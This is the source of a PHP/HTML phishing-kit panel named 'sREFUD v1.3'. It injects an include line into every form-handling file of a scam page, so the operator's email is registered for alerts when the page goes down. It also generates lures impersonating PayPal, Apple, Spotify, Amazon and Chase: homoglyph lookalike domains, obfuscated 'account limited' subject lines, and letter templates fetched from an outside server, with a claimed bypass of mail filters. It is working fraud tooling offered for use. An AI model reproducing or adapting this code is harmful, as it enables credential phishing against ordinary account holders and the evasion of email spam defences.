<?php
session_start();
error_reporting(0);
// made by Cyborg99" // https://icq.im/ra__3 "N3V3R D0WN HQ"
$next = $_GET['next'];
$folks = $_GET['folks'];

function getitnow($smallajar) {
$sar = substr_count($smallajar, '/'); 
if (strpos($sar, '1') !== false) {
$jar = '..';
}else if(strpos($sar, '2') !== false) {
$jar = '../..';	
}else if(strpos($sar, '3') !== false) {
$jar = '../../..';	
}else if(strpos($sar, '4') !== false) {
$jar = '../../../..';	
}else if(strpos($sar, '5') !== false) {
$jar = '../../../../..';	
}else{
exit(MOJODOJOJO);
}
$file = $smallajar;
$oldContents = file_get_contents($file);
$fr = fopen($file, 'w');
fwrite($fr, "<?php include_once'$jar/safe.php';?>");
fwrite($fr, $oldContents);
fclose($fr);
}




if(isset($_POST['chk'])) 
{
$str = $_POST["chk"];
foreach ($_POST['chk'] as $key => $value) {
getitnow($value);
}
}
?>

<?php
function getChak($len = 10) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
}

$email=$_POST['username'];
$dataString = 
"reportmail='".$email."'\r\n".
"update='http://highwall.space'\r\n".
"apikey='".$apikey."'";
if (isset($_POST['username'])) {
$fWrite = fopen("safe.ini",'w+');
$wrote = fwrite($fWrite, $dataString);
fclose($fWrite);
}

?>

<html lang="en"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
<meta charset="UTF-8">
<link rel="shortcut icon" type="image/x-icon" href="http://www.pngmart.com/files/10/Clover-PNG-Transparent.png">
<title>sREFUD v1.3</title>
<link href="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.css" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.js" type="text/javascript"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src='https://cdn.jsdelivr.net/npm/sweetalert2'></script>

<style>
  html, body * { box-sizing: border-box; font-family: 'Open Sans', sans-serif; }

body {
  background:
    linear-gradient(
    rgba(246,247,249,0.8),
    rgba(246,247,249,0.8)),
    url() no-repeat center center fixed;
  background-size: cover;
}

.container {
  width: 100%;
  padding-top: 60px;
  padding-bottom: 100px;
}

.frame {
  height: 800px;
  width: 430px;
  background:
    linear-gradient(
    rgba(35,43,85,0.75),
    rgba(35,43,85,0.95)),
    url() no-repeat center center;
  background-size: cover;
  margin-left: auto;
  margin-right: auto;
  border-top: solid 1px rgba(255,255,255,.5);
  border-radius: 20px;
  box-shadow: 0px 2px 7px rgba(0,0,0,0.2);
  overflow: hidden;
  transition: all .5s ease;
}

.frame-long {
  height: 1100px;
}

.frame-short {
  height: 400px;
  margin-top: 50px;
  box-shadow: 0px 2px 7px rgba(0,0,0,0.1);
}

.nav {
  width: 100%;
  height: 100px;
  padding-top: 40px;
  opacity: 1;
  transition: all .5s ease;
}

.nav-up {
  -webkit-transform: translateY(-100px);
          transform: translateY(-100px);
  opacity: 0;
}

li {
  padding-left: 10px;
  font-size: 18px;
  display: inline;
  text-align: left;
  text-transform: uppercase;
  padding-right: 10px;
  color: #ffffff;
}

.signin-active a {
  padding-bottom: 10px;
  color: #ffffff;
  text-decoration: none;
  border-bottom: solid 2px #fd90f0;
  transition: all .25s ease;
  cursor: pointer;
}

.signin-inactive a {
  padding-bottom: 0;
  color: rgba(255,255,255,.3);
  text-decoration: none;
  border-bottom: none;
  cursor: pointer;
}

.signup-active a {
  cursor: pointer;
  color: #ffffff;
  text-decoration: none;
  border-bottom: solid 2px #fd90f0;
  padding-bottom: 10px;
}

.signup-inactive a {
  cursor: pointer;
  color: rgba(255,255,255,.3);
  text-decoration: none;
  transition: all .25s ease;
}

.form-signin {
  width: 430px;
  height: 375px;
	font-size: 16px;
	font-weight: 300;
  padding-left: 37px;
  padding-right: 37px;
  padding-top: 1px;
  transition: opacity .5s ease, -webkit-transform .5s ease;
  transition: opacity .5s ease, transform .5s ease;
  transition: opacity .5s ease, transform .5s ease, -webkit-transform .5s ease;
}

.form-signin-left {
  -webkit-transform: translateX(-400px);
          transform: translateX(-400px);
  opacity: .0;
}

.form-signup {
  width: 430px;
  height: 388px;
	font-size: 16px;
	font-weight: 300;
  padding-left: 37px;
  padding-right: 37px;
  padding-top: 1px;
  position: relative;
  top: -375px;
  left: 400px;
  opacity: 0;
  transition: all .5s ease;
}

.form-signup-left {
  -webkit-transform: translateX(-399px);
          transform: translateX(-399px);
  opacity: 1;
}

.form-signup-down {
  top: 0px;
  opacity: 0;
}

.success {
  width: 80%;
  height: 150px;
  text-align: center;
  position: relative;
  top: -890px;
  left: 450px;
  opacity: .0;
  transition: all .8s .4s ease;
}

.success-left {
  -webkit-transform: translateX(-406px);
          transform: translateX(-406px);
  opacity: 1;
}

.successtext {
  color: #ffffff;
	font-size: 16px;
	font-weight: 300;
  margin-top: -35px;
  padding-left: 37px;
  padding-right: 37px;
}

#check path {
    stroke: #ffffff;
    stroke-linecap:round;
    stroke-linejoin:round;
    stroke-width: .85px;
    stroke-dasharray: 60px 300px;
    stroke-dashoffset: -166px;
    fill: rgba(255,255,255,.0);
    transition: stroke-dashoffset 2s ease .5s, fill 1.5s ease 1.0s;
}

#check.checked path {
    stroke-dashoffset: 33px;
    fill: rgba(255,255,255,.03);
}

.form-signin input, .form-signup input {
  color: #ffffff;
  font-size: 13px;
}

.form-styling {
  width: 100%;
  height: 35px;
	padding-left: 15px;
	border: none;
	border-radius: 20px;
  margin-bottom: 20px;
  background: rgba(255,255,255,.2);
}

label {
  font-weight: 400;
  text-transform: uppercase;
  font-size: 14px;
  padding-left: 15px;
  padding-bottom: 10px;
  color: rgba(255,255,255,.7);
  display: block;
}

:focus {outline: none;
}

.form-signin input:focus, textarea:focus, .form-signup input:focus, textarea:focus {
    background: rgba(255,255,255,.3);
    border: none; 
    padding-right: 40px;
    transition: background .5s ease;
 }

[type="checkbox"]:not(:checked),
[type="checkbox"]:checked {
  position: absolute;
  display: none;
}

[type="checkbox"]:not(:checked) + label,
[type="checkbox"]:checked + label {
  position: relative;
  padding-left: 85px;
  padding-top: 2px;
  cursor: pointer;
  margin-top: 8px;
}

[type="checkbox"]:not(:checked) + label:before,
[type="checkbox"]:checked + label:before,
[type="checkbox"]:not(:checked) + label:after,
[type="checkbox"]:checked + label:after {
  content: '';
  position: absolute;
}

[type="checkbox"]:not(:checked) + label:before,
[type="checkbox"]:checked + label:before {
  width: 65px; 
  height: 30px;
  background: rgba(255,255,255,.2);
  border-radius: 15px;
  left: 0; 
  top: -3px;
  transition: all .2s ease;
}

[type="checkbox"]:not(:checked) + label:after,
[type="checkbox"]:checked + label:after {
  width: 10px; 
  height: 10px;
  background: rgba(255,255,255,.7);
  border-radius: 50%;
  top: 7px; 
  left: 10px;
  transition: all .2s ease;
}

/* on checked */
[type="checkbox"]:checked + label:before {
  background: #0F4FE6; 
}

[type="checkbox"]:checked + label:after {
  background: #ffffff;
  top: 7px; 
  left: 45px;
}

[type="checkbox"]:checked + label .ui,
[type="checkbox"]:not(:checked) + label .ui:before,
[type="checkbox"]:checked + label .ui:after {
  position: absolute;
  left: 6px;
  width: 65px;
  border-radius: 15px;
  font-size: 14px;
  font-weight: bold;
  line-height: 22px;
  transition: all .2s ease;
}

[type="checkbox"]:not(:checked) + label .ui:before {
  content: "no";
  left: 32px;
  color: rgba(255,255,255,.7);
}

[type="checkbox"]:checked + label .ui:after {
  content: "yes";
  color: #ffffff;
}

[type="checkbox"]:focus + label:before {
  box-sizing: border-box;
  margin-top: -1px;
}

.btn-signup {
  float: left;
  font-weight: 700;
  text-transform: uppercase;
  font-size: 13px;
  text-align: center;
  color: #ffffff;
  padding-top: 8px;
  width: 100%;
  height: 35px;
	border: none;
	border-radius: 20px;
  margin-top: 23px;
  background-color: rgb(26, 222, 59);
}

.btn-signin {
  float: left;
  padding-top: 8px;
  width: 100%;
  height: 35px;
	border: none;
	border-radius: 20px;
  margin-top: -8px;
}

.btn-animate {
  float: left;
  font-weight: 700;
  text-transform: uppercase;
  font-size: 13px;
  text-align: center;
  color: rgba(255,255,255, 1);
  padding-top: 8px;
  width: 100%;
  height: 35px;
	border: none;
	border-radius: 20px;
  margin-top: 23px;
  background-color: rgb(26, 222, 59);
  left: 0px;
  top: 0px;
  transition: all .5s ease, top .5s ease .5s, height .5s ease .5s, background-color .5s ease .75s; 
}

.btn-animate-grow {
  width: 130%;
  height: 625px;
  position: relative;
  left: -55px;
  top: -420px;
  color: rgba(255,255,255,0);
  background-color: rgb(26, 222, 59);
}

a.btn-signup:hover, a.btn-signin:hover {
    cursor: pointer; 
    background-color: rgb(20, 185, 48);
    transition: background-color .5s; 
}

.forgot {
  height: 100px;
  width: 80%;
  margin-left: auto;
  margin-right: auto;
  text-align: center;
  padding-top: 24px;
  margin-top: -535px;
  border-top: solid 1px rgba(255,255,255,.3);
  transition: all 0.5s ease;
}

.forgot-left {
  -webkit-transform: translateX(-400px);
          transform: translateX(-400px);
  opacity: 0;
}

.forgot-fade {
  opacity: 0;
}

.forgot a {
  color: rgba(255,255,255,.3);
  font-weight: 400;
  font-size: 13px;
  text-decoration: none;
}

.welcome {
  width: 100%;
  height: 50px;
  position: relative;
  color: rgba(35,43,85,0.75);
  opacity: 0;
  transition: opacity .1s ease 1s, -webkit-transform 1.5s ease .25s;
  transition: transform 1.5s ease .25s, opacity .1s ease 1s;
  transition: transform 1.5s ease .25s, opacity .1s ease 1s, -webkit-transform 1.5s ease .25s;
}

.welcome-left {
  -webkit-transform: translateY(-780px);
          transform: translateY(-780px);
  opacity: 1; 
}

.cover-photo {
  height: 150px;
  position: relative;
  left: 0px;  top: -900px;
  background:
    linear-gradient(
    rgba(35,43,85,0.75),
    rgba(35,43,85,0.95)),
    url();
  background-size: cover;
  opacity: 0;
  transition: all 1.5s ease 0.55s;
}

.cover-photo-down {
  top: -575px;
  opacity: 1;
}

.profile-photo {
  height: 125px;
  width: 125px;
  position: relative;
  border-radius: 70px;
  left: 155px;
  top: -1000px;
  background: url();
  background-size: 100% 135%;
  background-position: 100% 100%;
  opacity: 0;
  transition: top 1.5s ease 0.35s, opacity .75s ease .5s;
  border: solid 3px #ffffff;
}

.profile-photo-down {
  top: -636px;
  opacity: 1;
}

h1 {
  color: #ffffff;
  font-size: 35px;
	font-weight: 300;
  text-align: center;
}

.btn-goback {
  position: relative;
  margin-right: auto;
  top: -400px;
  float: left;
  padding: 8px;
  width: 83%;
  margin-left: 37px;
  margin-right: 37px;
  height: 35px;
	border-radius: 20px;
  font-weight: 700;
  text-transform: uppercase;
  font-size: 13px;
  text-align: center;
  color: #fd90f0;
  margin-top: -8px;
  border: solid 1px #fd90f0;
  opacity: 0;
  transition: top 1.5s ease 0.35s, opacity .75s ease .5s;
}

.btn-goback-up {
  top: -1080px;
  opacity: 1;
}

a.btn-goback:hover {
    cursor: pointer; 
    background-color: #0F4FE6;
    transition: all .5s; 
    color: #ffffff;
}

/* refresh button styling */

#refresh {
    position: fixed;
    bottom: 20px;
    right: 20px; 
    background-color: #ffffff;
    width: 50px;
    height: 50px;
    border-radius: 25px;
    box-shadow: 0px 2px 7px rgba(0,0,0,0.1);
    padding: 13px 0 0 13px;
}

.refreshicon {
    fill: #d3d3d3;
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
    transition: fill .25s ease, -webkit-transform .25s ease;
    transition: fill .25s ease, transform .25s ease;
    transition: fill .25s ease, transform .25s ease, -webkit-transform .25s ease;
}

.refreshicon:hover {
  cursor: pointer;
  fill: #fd90f0;
  -webkit-transform: rotate(180deg);
          transform: rotate(180deg);
}
.wait {cursor: wait;}
.disp {display: none;}
</style>
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,700" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Tomorrow&display=swap" rel="stylesheet">

<div class="container">
<!--img style="margin-left: 45%; width: 184px; margin-right: 45%; padding: 17px;" src="https://i.imgur.com/gBHSvnU.png"  -->
<div class="frame">
<p align="center" style="    color: aliceblue;
    padding: 7px;
    font-size: 31px;
    background: darkslateblue;font-family: 'Tomorrow', sans-serif;" >sREFUD V 1.3</p>
<div class="nav">
<ul class"links"="">
<li class="signin-active"><a class="btn active">Notification</a></li>
<li class="signup-inactive"><a class="btn active">Gen Tool </a></li>
</ul>
<br><br>
</div>
<div ng-app="" ng-init="checked = false" class="ng-scope">
<form id="formsubmity" class="form-signin ng-pristine ng-valid" action="" method="post" name="form">
<p style="color: #000000;
    font-weight: 500;
    border: 1px solid #edf3ed;
    padding: 13px;
    background-color: #e7e4f1;
    border-radius: 11px;">Get a notification to your email when your scam page go down :</p>
<br>
<label for="username">Email</label>
<input class="form-styling" type="text" name="username" placeholder="">
<!-- /////////////////////////////////////////////////////////////////////////////////////////////////////// -->
<?php
function getDirContents($dir, &$results = array()){
    $files = scandir($dir);

    foreach($files as $key => $value){
        $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
        if(!is_dir($path)) {
            $results[] = $path;
        } else if($value != "." && $value != "..") {
            getDirContents($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}

function after ($thiskey, $inthat){
    if (!is_bool(strpos($inthat, $thiskey)))
    return substr($inthat, strpos($inthat,$thiskey)+strlen($thiskey));
};

$path = 'is'; // Folder Name

$allfiles = getDirContents('./'.$path);

    foreach( $allfiles as $file ) {
        if( strpos(file_get_contents($file),'$_POST') !== false || strpos($file, "index.php") !== false ) {

            $file = $path . after( $path, $file );
			$one = '\\';
			$tow = '/';
			$pacs = str_replace($one,$tow,$file);

			echo '<input hidden value="'.$pacs.'" name="chk[]">';
        }   
    }
?>
<script>
function showtime() {
  setTimeout(function(){
var element = document.getElementById("diva");
var clement = document.getElementById("aiva");
  element.classList.remove("disp");
  clement.classList.add("disp");
  $('#noobs').css('display', 'block');
  }, 8000);
}
</script>
<script>
document.addEventListener("DOMContentLoaded", function(){
showtime();
});
</script>
<br>
<div id="aiva" class="" ><img style="width: 71px; margin-left: 40%;" src="https://icon-library.net/images/loading-gif-icon/loading-gif-icon-19.jpg" ><p style="color: #5bff10;margin-left: 40%;">LOADING</p></div>
<div id="diva" class="disp"><img style="width: 79px; margin-left: 40%;" src="https://img.icons8.com/cotton/2x/checkmark.png" ><p style="color: #5bff10;margin-left: 25%;">SUCCESSFULLY LOADED</p></div>
<div id="giva" class="disp"><img style="margin-left: 32%; width: 148px; padding: 8px;" src="https://i.gifer.com/ZLBW.gif" ><p style="color: #5bff10; margin-left: 1%; border: 1px solid #edf3ed; text-align: center; background-color: black;">SUCCESSFULLY INSTALLED</p></div>

<br>
<!-- /////////////////////////////////////////////////////////////////////////////////////////////////////// -->

<script>
function instally(){
var x = document.forms["form"]["username"].value;
  if (x == "") {
    alert("Put your email - حط ايمايل يا بهيم");
    return false;
  }
$.ajax({
                        type: "POST",
                        url: "index.php",
                        data: $('#formsubmity').serialize(),
                        cache: false,
                        success: function (data) {
							$('#diva').css('display', 'none');
							$('#buta').css('display', 'none');
                            $('#giva').css('display', 'block');
							$('#noobs').css('display', 'none');
                        }
                    });
}
</script>

<div style="padding: 11px;">
<a id="buta" onclick="instally()" style="float: left; font-weight: 700; text-transform: uppercase; font-size: 13px; text-align: center; color: rgb(8, 46, 68); padding-top: 8px; width: 100%; height: 35px; border: none; border-radius: 20px; margin-top: 23px; background-color: rgb(26, 222, 59); left: 0px; top: 0px; transition: all .5s ease, top .5s ease .5s, height .5s ease .5s, background-color .5s ease .75s;cursor: pointer; ">INSTALL</a>
</div>
<br>
<br>
<br>
<div id="noobs" class="disp" style="padding: 23px;" >
<p style="color: #000000; border: 1px solid #edf3ed; padding: 12px; background-color: #f4f3f7; border-radius: 8px; font-size: 15px; font-weight: 500; font-family: 'Raleway', sans-serif;">Remind : 🔔<br><br> Before you click install button, Make a folder under the name ( is ) & put your scam page files there and then reload & click install.</p>
</div>

</form>
<form class="form-signup ng-pristine ng-valid" action="javascript:void(0)" method="post" name="form">
<!-- >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> --><!-- >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> -->
<p style="color: #fbfbfb; font-weight: 500; border: 1px solid #edf3ed; padding: 13px; background-color: #4829a9;border-radius: 11px;">Generate Encrypted Letter And Encrypted Subdomain + Subject :</p>

<style>
/* Design tiré du site flatuicolors.com */

/* Réinitialisation */

*{
    margin: 0; padding: 0;
    box-sizing:         border-box;
    -moz-box-sizing:    border-box;
    -webkit-box-sizing: border-box;
}

body{font-family: 'Open Sans';}
a{color: #000; text-decoration: none;}
img{max-width: 100%;}
img a{border: none;}
ul{list-style-type: none;}

/* Fin Réinitialisation */

/* Démo */


.demo{
    width: 600px;
    margin: 100px auto 0 auto;
}

.demo h2{
    font-weight: 300;
    color: #444;
    font-size: 1.4em;
    border-bottom: 1px solid #444;
    padding-bottom: 5px;
    margin-bottom: 20px;
    letter-spacing: 1px;
}

.demo p{
    font-weight: 300;
    color: #444;
    font-size: 0.9em;
    line-height: 25px;
    margin-bottom: 40px;
    text-align: justify;
}

.demo span{
    display: block;
    font-weight: 300;
    font-style: italic;
    font-size: 0.75em;
    text-align: center;
    color: #6a6a6a
}

.demo span a{
   color: #6a6a6a 
}

.demo span a:hover{
   text-decoration: underline;
}

/* Old-Select */

.old-select{
    position: absolute;
    top: -9999px;
    left: -9999px;
}

/* New-Select */

.new-select{
    width: 300px;
    height: 50px;
    margin: auto;
    
    margin-top: 50px;
    text-align: center;
    color: #444;
    line-height: 50px;
    position: relative;
}

.new-select .selection:active{
    transform:         rotateX(42deg);
    -o-transform:      rotateX(42deg);
    -ms-transform:     rotateX(42deg);
    -moz-transform:    rotateX(42deg);
    -webkit-transform: rotateX(42deg);
    transform-style:         preserve-3d;
    -o-transform-style:      preserve-3d;
    -ms-transform-style:     preserve-3d;
    -moz-transform-style:    preserve-3d;
    -webkit-transform-style: preserve-3d;
    transform-origin:         top;
    -o-transform-origin:      top;
    -ms-transform-origin:     top;
    -moz-transform-origin:    top;
    -webkit-transform-origin: top;
    transition:         transform         200ms ease-in-out;
    -o-transition:      -o-transform      200ms ease-in-out;
    -ms-transition:     -ms-transform     200ms ease-in-out;
    -moz-transition:    -moz-transform    200ms ease-in-out;
    -webkit-transition: -webkit-transform 200ms ease-in-out;
}

.new-select .selection{
    width: 100%;
    height: 100%;
    background-color: #fff;
    box-shadow: 0 1px 1px rgba(0,0,0,0.1);
    
    cursor: pointer;
    position: relative;
    z-index: 20; /* Doit être supérieur au nombre d'option */
    
    transform:         rotateX(0deg);
    -o-transform:      rotateX(0deg);
    -ms-transform:     rotateX(0deg);
    -moz-transform:    rotateX(0deg);
    -webkit-transform: rotateX(0deg);
    transform-style:         preserve-3d;
    -o-transform-style:      preserve-3d;
    -ms-transform-style:     preserve-3d;
    -moz-transform-style:    preserve-3d;
    -webkit-transform-style: preserve-3d;
    transform-origin:         top;
    -o-transform-origin:      top;
    -ms-transform-origin:     top;
    -moz-transform-origin:    top;
    -webkit-transform-origin: top;
    transition:         transform         200ms ease-in-out;
    -o-transition:      -o-transform      200ms ease-in-out;
    -ms-transition:     -ms-transform     200ms ease-in-out;
    -moz-transition:    -moz-transform    200ms ease-in-out;
    -webkit-transition: -webkit-transform 200ms ease-in-out;
}

.new-select .selection p{
    width: calc(100% - 60px);
    position: relative;
    
    transition:         all 200ms ease-in-out;
    -o-transition:      all 200ms ease-in-out;
    -ms-transition:     all 200ms ease-in-out;
    -moz-transition:    all 200ms ease-in-out;
    -webkit-transition: all 200ms ease-in-out;
}

.new-select .selection:hover p, .new-select .selection.open p{
    color: #bdc3c7;
}

.new-select .selection i{
    display: block;
    width: 1px;
    height: 70%;
    position: absolute;
    right: -1px; top: 15%; bottom: 15%;
    border: none;
    background-color: #bbb;
}

.new-select .selection > span{
    display: block;
    width: 0;
    height: 0;
    border-style: solid;
    border-width: 14px 8px 0 8px; /* Height: 14px / Width: 16px */
    border-color: #bbb transparent transparent transparent;
    
    position: absolute;
    top: 18px; /* 50 / 2 - 14 / 2 */
    right: 22px; /* 60 / 2 - 16 / 2 */
}

.new-select .selection.open > span{
    width: 0;
    height: 0;
    border-style: solid;
    border-width: 0 8px 14px 8px;
    border-color: transparent transparent #bbb transparent;
}

.new-option{
    text-align: center;
    background-color: #fff;
    cursor: pointer;
    box-shadow: 0 1px 1px rgba(0,0,0,0.1);
    position: relative;
    margin-top: 1px;
    
    position: absolute;
    left: 0; right: 0;
    
    transition:         all 300ms ease-in-out;
    -o-transition:      all 300ms ease-in-out;
    -ms-transition:     all 300ms ease-in-out;
    -moz-transition:    all 300ms ease-in-out;
    -webkit-transition: all 300ms ease-in-out;
}

.new-option p{
    width: calc(100% - 60px);
}

.new-option.reveal:hover{
    background-color: #444;
    color: #f5f5f5;
}
</style>



<select class="old-select" name="usgsfeed">
<option value="paypal">Paypal - (EN)</option>
<option value="apple">Apple - (EN)</option>
<option value="spotify">Spotify - (EN)</option>
<option value="amazon">Amazon - (EN)</option>
<option value="chase">Chase - (EN) - by @posiano17</option>
</select>
<br>

<?php if (($_GET['big'] ?? '') == 'three') {echo '<p style="color: aqua; font-weight: 300;"> ( GMAIL - HOTMAIL - YAHOO ) BYPASS - Activated </p>';}?>


<div class="new-select">
<div class="selection">
<p>
<span></span>
<i></i>
</p>
<span></span>
</div>
</div>
<script id="rendered-js">

$(document).ready(function () {

  var countOption = $('.old-select option').size();

  function openSelect() {
    var heightSelect = $('.new-select').height();
    var j = 1;
    $('.new-select .new-option').each(function () {
      $(this).addClass('reveal');
      $(this).css({
        'box-shadow': '0 1px 1px rgba(0,0,0,0.1)',
        'left': '0',
        'right': '0',
        'top': j * (heightSelect + 1) + 'px' });

      j++;
    });
  }

  function closeSelect() {
    var i = 0;
    $('.new-select .new-option').each(function () {
      $(this).removeClass('reveal');
      if (i < countOption - 3) {
        $(this).css('top', 0);
        $(this).css('box-shadow', 'none');
      } else
      if (i === countOption - 3) {
        $(this).css('top', '3px');
      } else
      if (i === countOption - 2) {
        $(this).css({
          'top': '7px',
          'left': '2px',
          'right': '2px' });

      } else
      if (i === countOption - 1) {
        $(this).css({
          'top': '11px',
          'left': '4px',
          'right': '4px' });

      }
      i++;
    });
  }

  // Initialisation
  if ($('.old-select option[selected]').size() === 1) {
    $('.selection p span').html($('.old-select option[selected]').html());
  } else
  {
    $('.selection p span').html($('.old-select option:first-child').html());
  }

  $('.old-select option').each(function () {
    newValue = $(this).val();
    newHTML = $(this).html();
    $('.new-select').append('<div class="new-option" data-value="' + newValue + '" onclick="' + newValue + '();"><p>' + newHTML + '</p></div>');
  });

  var reverseIndex = countOption;
  $('.new-select .new-option').each(function () {
    $(this).css('z-index', reverseIndex);
    reverseIndex = reverseIndex - 1;
  });

  closeSelect();


  // Ouverture / Fermeture
  $('.selection').click(function () {
    $(this).toggleClass('open');
    if ($(this).hasClass('open') === true) {openSelect();} else
    {closeSelect();}
  });

  $('.new-option').click(function () {
    var newValue = $(this).data('value');

    $('.selection p span').html($(this).find('p').html());
    $('.selection').click();

    // Selection Old Select
    $('.old-select option[selected]').removeAttr('selected');
    $('.old-select option[value="' + newValue + '"]').attr('selected', '');


  });
});
    </script>
<!-- >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> -->
<br>
<br>
<br>

<script>
function makebaz(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}
function spotify() {
    function download_to_textbox(url, el) {
        $.get(url, null, function (data) {
            el.val(data);
        }, "text");
    }
    download_to_textbox("https://highwall.space/status/herbs/sp1.php<?php if (($_GET['big'] ?? '') == 'three') {echo '?big=bypass';}?>", $("#mega"));
///////////////////////////////////////////////////////////////////
var spotia = ["Your payмenт didn't go through", 'A problem with your payмenт', 'payмenт failed', 'Payment declined', 'Your payment method was declined'];
///////////////////////////////////////////////////////////////////
var spont = spotia[Math.floor(Math.random() * spotia.length)];
	
	
	var roc = Math.floor(Math.random() * 99999);
	document.getElementById("Subdomain").value = "www.ѕρσtιfу.com."+roc;
	document.getElementById("Domain").value = "#spotify.com/login?continue="+makebaz(22);
	document.getElementById("Subject").value = "Action needed - "+spont;
	
		new Noty({
	layout: 'bottomRight',
	type: 'warning',
	progressBar:true,
    text: 'Spotify (EN) - Generated & Obfuscated',
	timeout: 5000,
	    animation: {
        easing: 'swing',
        speed: 500 // opening & closing animation speed
    },
}).show();
	
}
function apple() {
    function download_to_textbox(url, el) {
        $.get(url, null, function (data) {
            el.val(data);
        }, "text");
    }
    download_to_textbox("https://highwall.space/status/herbs/app1.php<?php if (($_GET['big'] ?? '') == 'three') {echo '?big=bypass';}?>", $("#mega"));
///////////////////////////////////////////////////////////////////
var myShows = ['your accoυnт access is temporarily Liмited', 'Your accoυnт has been Liмited untiI we hear from you', 'your accoυnт access is temporarily Liмited'];
///////////////////////////////////////////////////////////////////
var show = myShows[Math.floor(Math.random() * myShows.length)];

	var roc = Math.floor(Math.random() * 99999);
	var dom = Math.floor(Math.random() * 999999);
	document.getElementById("Subdomain").value = "www.αρρle.com."+roc;
	document.getElementById("Domain").value = "#apple.com/HT"+dom;
	document.getElementById("Subject").value = "Action needed - "+show;
	
	new Noty({
	layout: 'bottomRight',
	type: 'warning',
	progressBar:true,
    text: 'Apple (EN) - Generated & Obfuscated',
	timeout: 5000,
	    animation: {
        easing: 'swing',
        speed: 500 // opening & closing animation speed
    },
}).show();
}

function paypal() {
    function download_to_textbox(url, el) {
        $.get(url, null, function (data) {
            el.val(data);
        }, "text");
    }
    download_to_textbox("https://highwall.space/status/herbs/pp1.php<?php if (($_GET['big'] ?? '') == 'three') {echo '?big=bypass';}?>", $("#mega"));
///////////////////////////////////////////////////////////////////
var payipal = ['your accoυnт access is temporarily Liмited', 'Your accoυnт has been Iimited untiI we hear from you', 'your accoυnт access is temporarily liмiтed', 'paypal your accoυnт access is temporarily Liмited', 
'Your accoυnт PayPaI will be Liмited in 48h'];
///////////////////////////////////////////////////////////////////
var getpp = payipal[Math.floor(Math.random() * payipal.length)];

    var roc = Math.floor(Math.random() * 99999);


	document.getElementById("Subdomain").value = "www.ρaүρal.cσм."+roc;
	document.getElementById("Domain").value = "#paypal.com/cgi/"+makebaz(22);
	document.getElementById("Subject").value = "Action needed - "+getpp;
	
		new Noty({
	layout: 'bottomRight',
	type: 'warning',
	progressBar:true,
    text: 'Paypal (EN) - Generated & Obfuscated',
	timeout: 5000,
	    animation: {
        easing: 'swing',
        speed: 500 // opening & closing animation speed
    },
}).show();
}

function amazon() {
    function download_to_textbox(url, el) {
        $.get(url, null, function (data) {
            el.val(data);
        }, "text");
    }
    download_to_textbox("https://highwall.space/status/herbs/amz.php<?php if (($_GET['big'] ?? '') == 'three') {echo '?big=bypass';}?>", $("#mega"));
///////////////////////////////////////////////////////////////////
var aamazon = ['Aмazon accoυnт was recently changed', 'Reset your ρassword Aмazon','Reset your ρaѕѕword Aмazon','Create a new ρassword Aмazon'];
///////////////////////////////////////////////////////////////////
var getpp = aamazon[Math.floor(Math.random() * aamazon.length)];

    var roc = Math.floor(Math.random() * 99999);


	document.getElementById("Subdomain").value = "www.aмazon.cσм."+roc;
	document.getElementById("Domain").value = "#amazon.com/cgi/"+makebaz(22);
	document.getElementById("Subject").value = "Action needed - "+getpp;
	
		new Noty({
	layout: 'bottomRight',
	type: 'warning',
	progressBar:true,
    text: 'Amazon (EN) - Generated & Obfuscated',
	timeout: 5000,
	    animation: {
        easing: 'swing',
        speed: 500 // opening & closing animation speed
    },
}).show();
}

function chase() {
    function download_to_textbox(url, el) {
        $.get(url, null, function (data) {
            el.val(data);
        }, "text");
    }
    download_to_textbox("https://highwall.space/status/herbs/che.php<?php if (($_GET['big'] ?? '') == 'three') {echo '?big=bypass';}?>", $("#mega"));
///////////////////////////////////////////////////////////////////
var achase = ['Yoυr Accoυnт Haѕ Been Sυѕpended', 'Sυѕpicioυѕ Acтiviтieѕ','Restore access'];
///////////////////////////////////////////////////////////////////
var getpp = achase[Math.floor(Math.random() * achase.length)];

    var roc = Math.floor(Math.random() * 99999);


	document.getElementById("Subdomain").value = "www.cнaѕe.coм."+roc;
	document.getElementById("Domain").value = "#chase.com/cgi/"+makebaz(22);
	document.getElementById("Subject").value = "Action needed - "+getpp;
	
		new Noty({
	layout: 'bottomRight',
	type: 'warning',
	progressBar:true,
    text: 'Chase (EN) - Generated & Obfuscated',
	timeout: 5000,
	    animation: {
        easing: 'swing',
        speed: 500 // opening & closing animation speed
    },
}).show();
}

</script>

<label for="username">Encrypted Letter (Arabic dictionary) :</label>
<div>
<textarea style="margin: 0px; width: 365px; height: 272px;padding: 5px;" id="mega" rows="4" columns="20"></textArea>
</div>

<br>
<label for="username">Subdomain</label>
<input class="form-styling" id="Subdomain" type="text" name="Subdomain" value="">
<br>
<label for="username">Domain</label>
<input class="form-styling" id="Domain" type="text" name="Domain" value="">
<br>
